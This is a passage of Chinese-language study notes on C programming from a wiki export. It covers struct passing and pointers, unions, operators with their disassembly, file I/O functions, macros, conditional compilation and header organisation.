综上，调用Function前，会将main函数缓冲区中的某个地址压入堆栈，如此一来，Function函数内部就可以通过这个地址访问到main函数中的缓冲区（上述步骤1）。Function给自己的局部变量赋值后，将局部变量的值通过先前压入的参数，复制到main函数的缓冲区A位置，随后Function结束调用（上述步骤2）。在main函数中，将Function中复制到A位置的值，再复制一份到缓冲区中的其他位置B（上述步骤3）。最后，将位置B的值复制给结构体变量（上述步骤4）。 这个步骤3分析时感觉有些多余，但编译器确实是这样生成的。 关键部分的堆栈图示意如下图所示。 想起了在cpp中，拷贝构造函数，复制对象时，说的无名对象，就是指位置A这种情况吧。 如果在Function直接给main中局部变量赋值，传的就是指针。 不需要总结对应的反汇编代码。 可以总结的是： 结构体变量当参数或返回值传递时，会发生大量的内存复制，非常占用内存空间，在汇编层面是，非常消耗内存"},{"title":"结构体指针","path":"/wiki/C/结构体指针.html","content":"结构体指针 指针的类型是结构体，也是指针，也有我们之前学的那些指针特征（宽度，++，–，+N，-N，相减，差值）。 123456789struct Point&#123; int a; int b;&#125;; Point x; Point *p = &amp;x; 使用指针访问结构体成员 12345678910111213141516// 创建结构体Point p;p.x = 10;p.y = 20;// 声明结构体指针Point *ps;// 为结构体指针赋值ps = &amp;p;// 通过指针读取数据printf(&quot;%d &quot;, ps-&gt;x);// 通过指针修改数据ps-&gt;y = 100; 结构体指针一定要指向结构体吗？ 以下说法是❌的： 123456char型指针：指向一个char型的指针整型指针：指向一个整数的指针指针的指针：指向指针的指针 结构体指针：指向结构体的指针 数组指针：指向数组的指针 函数指针：指向函数的指针 指针的类型和它指向什么变量，一点关系都没有。不要把指针类型，和它指向的变量的类型之间建立任何联系。 指针的类型决定了指针的特征（之前讲的宽度，++，–，+N，-N，相减，差值那些），至于指向哪，没有关联。 例：结构体指针指向数组 不用关注指向的变量是什么类型，关注这种类型的指针的特征就行了，比如指针++后是加了几。 12345678910111213141516171819202122232425262728293031#include &quot;stdafx.h&quot;struct Point&#123; int x; int y;&#125;;int main()&#123; int arr[10] = &#123;1, 2, 3, 4, 5, 6, 7, 8, 9, 10&#125;; struct Point* p = (struct Point*)arr; // 强转为struct Point*类型 for (int i = 0; i &lt; 5; i++) &#123; printf(&quot;%d %d &quot;, (p+i)-&gt;x, (p+i)-&gt;y); &#125; printf(&quot; &quot;); //////////////////////////////////// p++; //++的宽度是Point*去掉一个*的宽度 //Point宽度是8字节，所以指针++增加8字节 int x = p-&gt;x; //x=3 int y = p-&gt;y; //y=4 printf(&quot;%d %d &quot;, x, y); return 0;&#125; 模拟CE按结构体对数据搜索的功能 查找这些数据中，有几个id=1 level=8的结构体信息 123456//结构体定义typedef struct TagPlayer &#123; int id; int level;\t&#125;Player; 123456789100x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x07,0x09, 0x00,0x20,0x10,0x03,0x03,0x0C,0x00,0x00,0x44,0x00,\t0x00,0x33,0x01,0x00,0x00,0x08,0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x02,0x64,0x00,0x00,0x00,0xAA,0x00,\t0x00,0x00,0x64,0x01,0x00,0x00,0x00,0x08,0x00,0x00, 0x00,0x00,0x02,0x00,0x74,0x0F,0x41,0x00,0x00,0x00, 0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x0A,0x00,\t0x00,0x02,0x57,0x4F,0x57,0x00,0x06,0x08,0x00,0x00, 0x00,0x00,0x00,0x64,0x00,0x0F,0x00,0x00,0x0D,0x00, 0x00,0x00,0x23,0x00,0x00,0x64,0x00,0x00,0x64,0x00 答案12345678910111213141516171819202122232425262728293031323334#include &quot;stdafx.h&quot;typedef struct TagPlayer &#123; int id; int level;&#125; Player;int main() &#123; unsigned char data[100] = &#123; 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x07, 0x09, 0x00, 0x20, 0x10, 0x03, 0x03, 0x0C, 0x00, 0x00, 0x44, 0x00, 0x00, 0x33, 0x01, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x64, 0x00, 0x00, 0x00, 0xAA, 0x00, 0x00, 0x00, 0x64, 0x01, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x74, 0x0F, 0x41, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x0A, 0x00, 0x00, 0x02, 0x57, 0x4F, 0x57, 0x00, 0x06, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x0F, 0x00, 0x00, 0x0D, 0x00, 0x00, 0x00, 0x23, 0x00, 0x00, 0x64, 0x00, 0x00, 0x64, 0x00 &#125;; //遍历时不超数组边界，最后一次在data的92位上，在+7个字节到末尾第99个。 //100-sizeof(Player) + 1 for (int i = 0; i &lt; 100 - sizeof(Player) + 1; ++i) &#123; Player *p = (Player *)&amp;data[i]; if (p-&gt;id == 1 &amp;&amp; p-&gt;level == 8) &#123; printf(&quot;Found Player at address: %p, ID: %d, Level: %d &quot;, (void *)p, p-&gt;id, p-&gt;level); //地址用&amp;data[i]也可以 //printf(&quot;Found Player at address: %p, ID: %d, Level: %d &quot;, (void *)&amp;data[i], p-&gt;id, p-&gt;level); &#125; &#125; return 0;&#125;"},{"title":"结构体数组","path":"/wiki/C/结构体数组.html","content":"结构体数组 结构体是种自定义类型，和int、char等内置类型使用上一样，也有数组。 12345678910111213类型 变量名[常量表达式]; // 定义结构体类型struct stStudent&#123; int Age; int Level;&#125;; // 定义结构体变量struct stStudent st;// 定义结构体数组struct stStudent arr[10]; 或者 stStudent arr[10]; 初始化 123456789struct stStudent &#123; int Age; int Level;&#125;; stStudent arr[5] = &#123;&#123;0,0&#125;, &#123;1,1&#125;, &#123;2,2&#125;, &#123;3,3&#125;, &#123;4,4&#125;&#125;;//或arr[0].Age = 100;arr[0].Level = 100; 结构体成员使用 结构体数组名[下标].成员名 12arr[0].Age = 10;int age = arr[0].Age; 内存结构 1234567struct stStudent&#123; int Age; char Name[0x20];&#125;;struct stStudent arr[3] = &#123;&#123;0,&quot;张三&quot;&#125;,&#123;1,&quot;李四&quot;&#125;,&#123;2,&quot;王五&quot;&#125;&#125;; int x = arr[0].Age; 连续存储"},{"title":"联合体","path":"/wiki/C/联合体.html","content":"引 需求：想存储一个人的学号和身份证号，只要存储其中一个就可以了。学号需要一个字节的空间，身份证号需要四个字节。如果用结构体来标识： 12345struct Student&#123; char 学号; int 身份证号;&#125;; 每次只用到一个成员，那么另一个成员的空间就会被浪费。 联合结构体 12345union TestUnion&#123; char x; int y;&#125;; 特点： 联合体中的成员是共享内存空间的 联合体只有一个成员占用内存空间 联合体占用的内存空间大小是联合体中最宽的成员类型，即max{成员1,成员2,…,成员n} 1234567891011121314151617181920#include &quot;stdafx.h&quot;union TestUnion&#123; char x; int y;&#125;;int main()&#123; TestUnion t; printf(&quot;%d &quot;, sizeof(TestUnion)); // union类型的大小是成员中最宽的那个 t.y = 0x12345678; // 给y赋值 printf(&quot;%x &quot;, t.x); // 按x的宽度取数据，取出来是78 printf(&quot;0x%x &quot;, t); // 按t的宽度取数据，取出来是12345678 printf(&quot;0x%x &quot;, t); // 按y的宽度取数据，取出来是12345678 return 0;&#125; 成员宽度都一样的话，使用union的原因就不是节省内存，而是为了更好的可读性 12345union TestUnion&#123; int x; int y;&#125;; 类型和变量 声明了一种联合体类型，该数据类型的名字为TestUnion。可以用TestUnion来定义union类型 12345union TestUnion&#123; char x; int y;&#125;; 正确的使用方法1TestUnion t; 错误的使用方法1TestUnion.y = 0x12345678; 声明了一个匿名的union类型（后面没法再次定义该类型的变量），定义了一个变量TestUnion。 12345union &#123; char x; int y;&#125;TestUnion; 正确的使用方法1TestUnion.y = 0x12345678; 错误的使用方法1TestUnion t;"},{"title":"运算符和表达式","path":"/wiki/C/运算符和表达式.html","content":"定义 运算符 表达式：由变量/常量和运算符组成的式子。 表达式一定会有一个结果。无论多么复杂的表达式，最终都是一个数 只有表达式，可以编译通过，但并不生成代码，需要与赋值或者其他流程控制语句一起组合的时候才有意义。 12345678910111213#include &quot;stdafx.h&quot;void func(int x,int y)&#123;\tx+y+1;&#125;int main()&#123;\tfunc(1,2);\treturn 0;&#125; 反汇编可以看到func函数里没有生成x+y+1的汇编代码 表达式结果的类型 char和short类型做运算前都会先转成int类型，再参与运算 表达式结果的类型由参与运行中最宽的那个类型决定 char-&gt;short-&gt;int-&gt;float-&gt;double 1234567891011int main()&#123;\tchar a;\tint b;\ta=10;\tb=20;\tprintf(&quot;%d&quot;,a+b);\treturn 0;&#125; 对应反汇编代码如下，可以看到用了movsx符号拓展指令去扩展变量的宽度为32位（eax/ecx） 类型转换 小转大 movsv，先符号拓展，然后传送 movzx，零拓展，然后传送 大转小 高位舍弃，低位截断 当表达式中同时存在有符号和无符号数的时候，表达式的结构将转换为无符号数。 mark，未来看到的话再整理，涉及上溢，下溢什么的 运算符 算数运算符 加 减 乘 除 取余 自加 自减 + - * / % ++ – 单行语句，i和i效果一样。 123i++;++i; ++i，放变量前面：先自加，然后参与运算 i++，放变量后面：先参与运算，然后自加 1234int i = 1;printf(&quot;%d &quot;, i++);printf(&quot;%d &quot;, ++i); 运算，在这个例子中表示为传参： i++：先传参数，然后自加 ++i：先自加，然后传参 思考题：如下两个的区别？ 123456789int plus(int x)&#123; return x++;&#125;int plus2(int x)&#123; return ++x;&#125; 关系运算符 小于 小于等于 大于 大于等于 等于 不等于 &lt; &lt;= &gt; &gt;= == != 关系运算符的值只能是0或1。 关系运算符的值为真时，结果值都为1 关系运算符的值为假时，结果值都为0 12345int a = 10;int b = 20;int c = a &gt; b;//结果：c=0int d = a &lt; b;//结果：c=1 逻辑运算符 非 逻辑与 逻辑或 ! &amp;&amp; || 无论表达式多么复杂，最终只有1个结果 12x&gt;y &amp;&amp; x&lt;z //最终只有一个结果x&gt;y || x&lt;z //最终只有一个结果 12345int x = 10;int y = 20;int z = 30;int r = x&gt;y &amp;&amp; x&lt;z ; 如果第一个表达式已算出为假，就不接着判断第二个表达式了，这种方式效率高。 btw，反汇编和if…else分支结构很像 如果用&amp;运算符，即使第一个表达式为假，也会接着判断第二个表达式，这种方式下代码执行效率会低些。 12345int x = 10;int y = 20;int z = 30;int r = x&gt;y &amp; x&lt;z ; 120040D7B2 cmp eax,dword ptr [ebp-8]0040D7B5 setg cl setg，标志条件是g，大于。 如果eax&gt;[ebp-8]，将cl置1，否则置0。 位运算符 左移 右移 非 或 异或 与 &lt;&lt; &gt;&gt; ~ | ^ &amp; 左移对无符号数和有符号数都一样，低位补0。 12345int y=2;unsigned int z=2;printf(&quot;有符号左移运算:%d&quot;,y&lt;&lt;1);printf(&quot;无符号左移运算:%d&quot;,z&lt;&lt;1); 反汇编看到用的都是shl指令。 右移，无符号数，高位补0；有符号数，高位补1。 12345int y=2;unsigned int z=2;printf(&quot;有符号右移运算:%d&quot;,y&gt;&gt;1);printf(&quot;无符号右移运算:%d&quot;,z&gt;&gt;1); 反汇编看到对于有符号数用的右移是算数右移sar，对于无符号数用的右移是逻辑右移shr 逻辑右移SHR，目的操作数右移若干位，最高位补0，最低位移入进位标志位CF 算数右移SAR，目的操作数右移若干位，最高位补符号位，最低位移入进位标志位CF 为什么需要位运算海哥的说法：加密内存控制从内存使用的角度来看，一个内存地址编号对应到的是1个字节的内容，1个字节有8位，而不是每1位是1个内存地址编号，所以要位运算，精准到这个字节中的具体哪一位 赋值运算符 拓展赋值 123x+=1;y&lt;&lt;=1; 条件运算符 条件运算符又称为三元运算符，由问号、分号组成。 1234int x = 10;int y = 20;int z = x&gt;y?2:3; 先把ecx清零。然后比较[ebp-4]和[ebp-8] 如果[ebp-4]&gt;[ebp-8]，cl就会置0，然后+2，赋值给局部变量z; 如果[ebp-4]&lt;=[ebp-8]，cl就会置1，然后+2，赋值给局部变量z; 编译器会根据值的不同，生成不同的汇编指令，这个例子并不是说条件运算符的汇编都是这样。逆向看多了，能看出来是用的三目运算符。 但没必要还原成开发者当时一模一样的c语言写法，逻辑功能一样即可，逆向看到上面的反汇编，用if…else还原也可以。 优先级 通过()改变优先级 语句 定义 语句，海哥的定义：只有对内存产生影响，比如修改或分配的才叫语句。下面这句x+y+1;就不算是语句，即使它加了; 1234567void main()&#123; int x=10; int y=20; x+y+1;&#125; 流程控制语句，if…else…整体是一个语句 12345678if()&#123;&#125;else&#123;&#125; 执行条件 表达式的结果会转换为布尔值，0为假，非0为真。 赋值表达式的结果是赋值的值，在下面这个例子x=2这个表达式结果就是2，为真，所以执行 123456789101112131415161718192021222324252627int main()&#123; int x; if(1) //执行 &#123; printf(&quot;1 &quot;); &#125; if(2) //执行 &#123; printf(&quot;2 &quot;); &#125; if(-1) //非0为真，执行 &#123; printf(&quot;3 &quot;); &#125; if(0) //不执行 &#123; printf(&quot;4 &quot;); &#125; if(x=2) //执行 &#123; //赋值表达式，它的结果是赋值的值，即2 printf(&quot;5 &quot;); &#125; return 0;&#125; 赋值语句的本质 本质：将某个值存储到变量中的过程就是赋值。 以下形式均是赋值语句，没有本质区别 123456789101112131415161718192021#include &lt;stdio.h&gt;int Add(int x, int y)&#123; return x + y;&#125;int main()&#123; int x = 10; int y = x + 10; int z = x * y; int k = (x + y) * z; int m = Add(x, y); return 0;&#125;"},{"title":"随手记一些函数","path":"/wiki/C/随手记一些函数.html","content":"文件读写相关函数 fopen函数 1234FILE *fopen( const char *filename, const char *mode); 打开一个文件，返回文件指针 fseek函数 移动文件指针到指定的位置 12345int fseek( FILE *stream, long offset, int origin); stream Pointer to FILE structure. offset Number of bytes from origin. origin Initial position. 需是下列常量之一： origin value Meaning SEEK_CUR Current position of file pointer.可以写1 SEEK_END End of file.可以写2 SEEK_SET Beginning of file.可以写0 ftell函数 Gets the current position of a file pointer.返回当前文件指针的位置 123long ftell( FILE *stream); fclose函数 Closes a stream (fclose) or closes all open streams (_fcloseall). 123int fclose( FILE *stream); fread函数 从给定的流stream中读取数据到指定的数组中 123456size_t fread( void *buffer, //指向一个内存块的指针，这个内存块用于接收从文件中读取的数据 size_t size, //每个元素的大小，以字节为单位 size_t count, //要读取的元素数量 FILE *stream //指向FILE对象的指针，该FILE对象标识了要从中读取数据的输入流); 返回值： fread返回成功读取的元素数量。如果这个数量比请求的数量小，可能是因为发生了错误或者到达了文件末尾。 fwrite Writes data to a stream. 123456size_t fwrite( const void *buffer, size_t size, size_t count, FILE *stream); 错误打印函数 参考：C 库函数 - perror() C 库函数void perror(const char *str)把一个描述性错误消息输出到标准错误stderr。首先输出字符串str，后跟一个冒号，然后是一个空格。 1void perror(const char *str) 1234567891011121314151617#include &lt;stdio.h&gt;int main()&#123; const char* filepath=&quot;C:\\\\WINDOWS\\\\system32\\ otepad123.exe&quot;; //一个不存在的路径 FILE* file; // 打开文件 file = fopen(filepath, &quot;rb&quot;); if (file == NULL) &#123; perror(&quot;Error opening file&quot;); return NULL; &#125; return 0;&#125;"},{"title":"预处理","path":"/wiki/C/预处理.html","content":"预处理一般是指在程序源代码被转换为二进制代码之前，由预处理器对程序源代码文本进行处理，处理后的结果再由编译器进一步编译。 预处理主要包括宏定义、文件包含、条件编译三部分。 宏定义 简单的宏：#define 标识符 字符序列 1234#define FALSE 0#define NAME &quot;LUODAOYI&quot;#define __IN#define __OUT 宏只是做一个简单的字符替换，比如下面这个例子，可以将method中各个字符用宏来表示，编译是可以通过的。 正常写的函数用宏替换1234567891011121314151617#include &quot;stdafx.h&quot;#include &lt;string.h&gt; #define NAME &quot;ABCD&quot;int method() &#123; char buffer[0x10]; strcpy(buffer,NAME); return 0;&#125;int main()&#123; method(); return 0;&#125;1234567891011121314151617181920#include &quot;stdafx.h&quot;#include &lt;string.h&gt; #define NAME &quot;ABCD&quot;#define A int method() &#123;#define B char buffer[0x10];#define C strcpy(buffer,NAME);#define D return 0;&#125;#define E method();ABCDint main()&#123; E return 0;&#125; 带参数的宏：#define 标识符(参数表) 字符序列 123#define MAX(A,B) ((A)&gt;(B)?(A):(B)) x = MAX(p, q); // 将被替换成y=((p) &gt; (q)?(p):(q) 多行声明： define可以替代多行的代码，记得后面加 \\ 正常写的函数用宏替换123456789101112131415161718#include &quot;stdafx.h&quot;int method(int arr[], int length)&#123; for (int i = 0; i &lt; length; i++) &#123; printf(&quot;%d &quot;, arr[i]); &#125; return 0;&#125;int main()&#123; int arr[] = &#123;1, 2, 3, 4, 5, 6, 7, 8, 9, 0&#125;; method(arr, 10); return 0;&#125;123456789101112131415161718192021222324252627#include &quot;stdafx.h&quot;//单行声明//#define MYPRINT(X,Y) for(int i=0;i&lt;(Y);i++)&#123;printf(&quot;%d &quot;,(X)[i]);&#125;//多行声明//前面的tab、空格无所谓#define MYPRINT(X,Y) for(int i=0;i&lt;(Y);i++)\\ &#123;\\ printf(&quot;%d &quot;,(X)[i]);\\ &#125;\\//下面这样也行/*#define MYPRINT(X,Y) for(int i=0;i&lt;(Y);i++)\\&#123;\\ printf(&quot;%d &quot;,(X)[i]);\\&#125;\\*/int main()&#123; int arr[] = &#123;1, 2, 3, 4, 5, 6, 7, 8, 9, 0&#125;; MYPRINT(arr, 10) return 0;&#125; 宏VS普通函数 查看这段代码的反汇编 1234567891011121314#include &quot;stdafx.h&quot;#define MYPRINT(X,Y) for(int i=0;i&lt;(Y);i++)\\ &#123;\\ printf(&quot;%d &quot;,(X)[i]);\\ &#125;\\int main()&#123; int arr[] = &#123;1, 2, 3, 4, 5, 6, 7, 8, 9, 0&#125;; MYPRINT(arr, 10) return 0;&#125; 发现宏是直接将字符序列直接贴到使用宏的地方，即内联到代码内 宏与函数的区别：函数调用要分配新的堆栈空间，而宏只是替换 优点 缺点 宏 直接内联到代码中，节省堆栈空间，无栈帧切换的动作 当代码中大量使用同一个宏时，这个宏会被复制多份，导致编译出的exe臃肿 函数 调用函数时压参数，call函数，不会像宏那样复制多份 需要栈帧切换 用宏或函数？逻辑短、很简单的可以用宏；逻辑复杂的用函数 注意事项 宏在编译前处理，只做字符序列的替换工作，不做任何语法检测；如果宏定义不当，错误要到预处理之后的编译阶段才能发现 宏名标识符与左圆括号之前不允许有空白符，应紧接在一起 为了避免出错，宏定义中给形参加上括号 多行声明时，回车换行前要加上字符'\\[enter]'，注意字符'\\'后要紧跟回车键，不能跟空格或其他字符，要不编译报错 宏的末尾不需要分号，要不替换时会将分号带上去替换，导致编译可能报错 条件编译 条件编译能控制某段代码最终编不编译，生不生成汇编代码 12345678910111213#include &quot;stdafx.h&quot;int main()&#123;#if 0 //表达式不成立，预处理时删掉这段代码 printf(&quot;--------&quot;)#endif#if 1 //表达不成立，预处理时保留这段代码，最终会编译 printf(&quot;********&quot;)#endif return 0;&#125; 常见场景，调试时增加一些调试的打印输出，调好了在将宏定义为0。 调试时发布时1234567891011#include &quot;stdafx.h&quot;#define DEBUG 1 int main()&#123;#if DEBUG printf(&quot;**一些调试信息**&quot;)#endif return 0;&#125;1234567891011#include &quot;stdafx.h&quot;#define DEBUG 0 int main()&#123;#if DEBUG printf(&quot;**一些调试信息**&quot;);#endif return 0;&#125; 预处理器在预处理步骤时，会判断条件编译值的真假 如果为真，则保留这段代码，后续编译步骤就会编译这段代码 如果为假，删掉这段代码，后续编译步骤就不会编译这段代码 预处理指令：条件编译是通过预处理指令实现的 指令 用途 #define 定义宏 #undef 取消已定义的宏 123456/*假设这里定义了DEBUG的值*/#undef DEBUG //取消之前DEBUG的定义#define DEBUG 1 //定义DEBUG 指令 用途 #if 如果给定条件为真，则编译下面代码 #endif 结束一个#if…#else条件编译块 #else 同else 指令 用途 #ifdef 如果宏已经定义，则编译下面代码 #ifndef 如果宏没有定义，则编译下面代码 写法一写法二1234567891011121314151617#include &quot;stdafx.h&quot;#define A int main()&#123;#if defined A //如果定义了A，则printf 1编译 printf(&quot;-----------1 &quot;);#elif defined B printf(&quot;-----------2 &quot;);#elif defined C printf(&quot;-----------3 &quot;);#endif return 0;&#125;12345678910111213141516171819#include &quot;stdafx.h&quot;#define A int main()&#123;//等价写法//#ifdef A#if defined A //如果定义了A，则printf 1编译 printf(&quot;-----------1 &quot;);#elif defined B printf(&quot;-----------2 &quot;);#elif defined C printf(&quot;-----------3 &quot;);#endif return 0;&#125; 例子 1234567891011#undef TRUE //取消TRUE定义#define TRUE 1 //定义TRUE#if defined a //如果a定义了#undef a //解除a的定义//define a 200 //重新定义a#endif //结束#if#ifndef a //如果a没有定义#define a 100 //定义a#endif //结束#if 文件包含 指令 用途 #include 包含文件 文件包含有两种格式，分别是#include &quot;file&quot;和#include &lt;file&gt; 使用双引号：系统首先到当前目录下查找，如果没找到，再到系统指定的包含文件目录(由用户在配置环境时设置)去找 使用尖括号：直接到系统指定的包含文件目录去查找 所以系统文件用&lt;&gt;尖括号，自己定义的文件用&quot;&quot;双引号。 多文件编程 良好的习惯：函数的声明放在a.h头文件中，实现放在a.cpp中（文件名随意，.h和.cpp要配套的） max.h1int max(int x, int y); max.cpp1234int max(int x, int y)&#123; return x &gt; y ? x : y;&#125; main.cpp12345678#include &lt;stdio.h&gt;#include &quot;max.h&quot;int main()&#123;\tint r=max(1,2);\treturn 0;&#125; 通过VC6自动生成配对的.h和.cpp文件VC6，在ClassView，右键，New Class，可以让编译器创建一对文件（.h和.cpp）d.hd.cpp1234567891011121314151617181920// d.h: interface for the d class.////////////////////////////////////////////////////////////////////////#if !defined(AFX_D_H__DCF3E4B9_36E9_4116_B0CC_6F3EB90C9D67__INCLUDED_)#define AFX_D_H__DCF3E4B9_36E9_4116_B0CC_6F3EB90C9D67__INCLUDED_#if _MSC_VER &gt; 1000#pragma once#endif // _MSC_VER &gt; 1000class d &#123;public:\td();\tvirtual ~d();&#125;;#endif // !defined(AFX_D_H__DCF3E4B9_36E9_4116_B0CC_6F3EB90C9D67__INCLUDED_)条件编译，确保夹在中间的代码只会编译一次1234#if !defined(AFX_D_H__DCF3E4B9_36E9_4116_B0CC_6F3EB90C9D67__INCLUDED_)#define AFX_D_H__DCF3E4B9_36E9_4116_B0CC_6F3EB90C9D67__INCLUDED_#endif // !defined(AFX_D_H__DCF3E4B9_36E9_4116_B0CC_6F3EB90C9D67__INCLUDED_)#pragma once也是编译一次，但是对编译器版本有要求。所以它先判断编译器版本（_MSC_VER，Microsoft，compiler，version）是否&gt;1000，如果符合，就加上#pragma once123#if _MSC_VER &gt; 1000#pragma once#endif // _MSC_VER &gt; 1000自动生成的类1234567class d &#123;public:\td();\tvirtual ~d();&#125;;12345678910111213141516171819// d.cpp: implementation of the d class.////////////////////////////////////////////////////////////////////////#include &quot;d.h&quot;//////////////////////////////////////////////////////////////////////// Construction/Destruction//////////////////////////////////////////////////////////////////////d::d()&#123;&#125;d::~d()&#123;&#125;自动生成的构造和析构函数123456789d::d()&#123;&#125;d::~d()&#123;&#125; 重复包含 max.cpp和min.cpp中要用到PrintPoint.h中的结构体Point。下面例子的做法是max.cpp里inluce了max.h，min.cpp里inclue了min.h，然后max.h里inclue了PrintPoint.h，min.h里里inclue了PrintPoint.h。最终main.cpp中include了max.h和min.h，导致结构体Point重复定义。 min.h123#include &quot;PrintPoint.h&quot;int min(int x, int y); max.h123#include &quot;PrintPoint.h&quot;int max(int x, int y); min.cpp1234567891011#include &quot;min.h&quot;int min(int x, int y)&#123;\treturn x &gt; y ? y : x;&#125;void PrintPoint_from_min(Point* p)&#123;&#125; max.cpp1234567891011#include &quot;max.h&quot;int max(int x, int y)&#123;\treturn x &gt; y ? x : y;&#125;void PrintPoint_from_max(Point* p)&#123;&#125; PrintPoint.h12345struct Point&#123;\tint x;\tint y;&#125;; PrintPoint.cpp123456#include &quot;PrintPoint.h&quot;void PrintPoint(Point* p)&#123;&#125; main.cpp12345678910#include &lt;stdio.h&gt;#include &quot;max.h&quot;#include &quot;min.h&quot;int main()&#123; return 0;&#125; 解决办法一：条件编译 修改PrintPoint.h如下。 当第一次include PrintPoint.h文件时，ZZZ没被定义，于是定义ZZZ，插入struct Point这段代码。 当第二次include PrintPoint.h文件时，发现ZZZ已被定义，不插入struct Point这段代码。确保struct Point只有1次声明。 ZZZ想写多复杂就写多复杂，保证唯一性。 12345678910#if !defined(ZZZ)#define ZZZstruct Point&#123;\tint x;\tint y;&#125;;#endif 解决办法二：前置声明 良好的习惯：不要在头文件中包含其他头文件。 在max.cpp和min.cpp中直接包含PrintPoint.h头文件 min.h1int min(int x, int y); max.h1int max(int x, int y); min.cpp123456789101112#include &quot;min.h&quot;+ #include &quot;PrintPoint.h&quot;int min(int x, int y)&#123;\treturn x &gt; y ? y : x;&#125;void PrintPoint_from_min(Point* p)&#123;&#125; max.cpp123456789101112#include &quot;max.h&quot;+ #include &quot;PrintPoint.h&quot;int max(int x, int y)&#123;\treturn x &gt; y ? x : y;&#125;void PrintPoint_from_max(Point* p)&#123;&#125; PrintPoint.h12345struct Point&#123;\tint x;\tint y;&#125;; PrintPoint.cpp123456#include &quot;PrintPoint.h&quot;void PrintPoint(Point* p)&#123;&#125; main.cpp123456789#include &lt;stdio.h&gt;#include &quot;max.h&quot;#include &quot;min.h&quot;int main()&#123; return 0;&#125; 问题还没完，我们继续将void PrintPoint_from_max(Point* p);函数声明加到max.h中，将void PrintPoint_from_min(Point* p)函数声明加到min.h中。 max.hmin.h123int max(int x, int y);void PrintPoint_from_max(Point* p);123int min(int x, int y);void PrintPoint_from_min(Point* p); 编译会报错，max.h和min.h中找不到Point。前边说了，别在头文件中包含另一个头文件，这个问题怎么解决？解决办法：前置声明。在max.h和min.h前面加上结构体Point的声明 max.hmin.h12345struct Point;int max(int x, int y);void PrintPoint_from_max(Point* p);12345struct Point;int min(int x, int y);void PrintPoint_from_min(Point* p); 记一次自己的疑问 在学习PE时写了一个为文件读入内存然后返回内存地址的函数，单文件编程的代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define FILE_PATH &quot;C:\\\\WINDOWS\\\\system32\\ otepad.exe&quot;void *ReadFileToFileBuffer(const char *filepath, size_t *length)&#123; FILE *pFile; void *buffer; //接malloc返回值 size_t file_size; // 打开文件 pFile = fopen(filepath, &quot;rb&quot;); if (pFile == NULL) &#123; perror(&quot;Error opening file&quot;); return NULL; &#125; // 定位到文件末尾 if (fseek(pFile, 0, SEEK_END) != 0) &#123; perror(&quot;Error seeking to end of file&quot;); fclose(pFile); return NULL; &#125; // 获取文件大小 file_size = ftell(pFile); if (file_size == -1L) &#123; perror(&quot;Error getting file size&quot;); fclose(pFile); return NULL; &#125; // 回到文件开头，后面要用fread读文件的内容 if (fseek(pFile, 0, SEEK_SET) != 0) &#123; perror(&quot;Error seeking to start of file&quot;); fclose(pFile); return NULL; &#125; // 分配内存 buffer = malloc(file_size); if (buffer == NULL) &#123; perror(&quot;Error allocating memory&quot;); fclose(pFile); return NULL; &#125; // fread是从当前文件指针开始读取 // 读取文件内容到内存 if (fread(buffer, 1, file_size, pFile) != file_size) &#123; perror(&quot;Error reading file into memory&quot;); free(buffer); fclose(pFile); return NULL; &#125; // 关闭文件 fclose(pFile); // 如果需要，返回文件大小 if (length != NULL) &#123; *length = file_size; &#125; // 返回内存缓冲区的指针 return buffer;&#125;int main()&#123; size_t length; void *FileBuffer = ReadFileToFileBuffer(FILE_PATH, &amp;length); if (FileBuffer != NULL) &#123; // 在这里使用file_data指针访问文件内容 // ... printf(&quot;address of this file: %p &quot;, FileBuffer); // 使用完毕后，释放内存 free(FileBuffer); &#125; return 0;&#125; 已知要用到的类型、函数和头文件的关系如下： 12#include &lt;stdio.h&gt; //perror fopen fseek ftell fclose printf#include &lt;stdlib.h&gt; //malloc free size_t 现在要改成多文件编程，应该怎么改？想法是将ReadFileToFileBuffer函数摘出来，分别放到.h和.cpp文件中 ReadFileToFileBuffer.hReadFileToFileBuffer.cpp123#include &lt;stdlib.h&gt; // 包含size_t的定义void* ReadFileToFileBuffer(const char* filepath, size_t* length);1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#include &lt;stdio.h&gt; //perror fopen fseek ftell fclose#include &lt;stdlib.h&gt; //malloc free size_t#include &quot;ReadFileToFileBuffer.h&quot;void *ReadFileToFileBuffer(const char *filepath, size_t *length)&#123; FILE *pFile; void *buffer; //接malloc返回值 size_t file_size; // 打开文件 pFile = fopen(filepath, &quot;rb&quot;); if (pFile == NULL) &#123; perror(&quot;Error opening file&quot;); return NULL; &#125; // 定位到文件末尾 if (fseek(pFile, 0, SEEK_END) != 0) &#123; perror(&quot;Error seeking to end of file&quot;); fclose(pFile); return NULL; &#125; // 获取文件大小 file_size = ftell(pFile); if (file_size == -1L) &#123; perror(&quot;Error getting file size&quot;); fclose(pFile); return NULL; &#125; // 回到文件开头，后面要用fread读文件的内容 if (fseek(pFile, 0, SEEK_SET) != 0) &#123; perror(&quot;Error seeking to start of file&quot;); fclose(pFile); return NULL; &#125; // 分配内存 buffer = malloc(file_size); if (buffer == NULL) &#123; perror(&quot;Error allocating memory&quot;); fclose(pFile); return NULL; &#125; // fread是从当前文件指针开始读取 // 读取文件内容到内存 if (fread(buffer, 1, file_size, pFile) != file_size) &#123; perror(&quot;Error reading file into memory&quot;); free(buffer); fclose(pFile); return NULL; &#125; // 关闭文件 fclose(pFile); // 如果需要，返回文件大小 if (length != NULL) &#123; *length = file_size; &#125; // 返回内存缓冲区的指针 return buffer;&#125; 然后main.cpp中已知肯定是要#include &quot;ReadFileToFileBuffer.h&quot;的，如下： 123456789101112131415161718192021#include &quot;ReadFileToFileBuffer.h&quot;#define FILE_PATH &quot;C:\\\\WINDOWS\\\\system32\\ otepad.exe&quot;int main()&#123; 